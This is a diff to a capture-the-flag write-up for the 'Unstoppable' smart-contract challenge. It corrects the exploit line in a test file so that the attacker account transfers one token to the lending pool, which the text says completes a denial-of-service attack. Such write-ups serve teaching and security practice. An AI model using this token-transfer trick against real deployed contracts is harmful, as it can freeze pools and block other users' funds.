@@ -38,7 +38,7 @@ Transfer 1 (or more) token(s) to the pool to complete the DoS attack:
 ```js:test/unstoppable/unstoppable.challenge.js
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        await this.token.connect().transfer(this.pool.address, 1);
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
     });
 ```
 
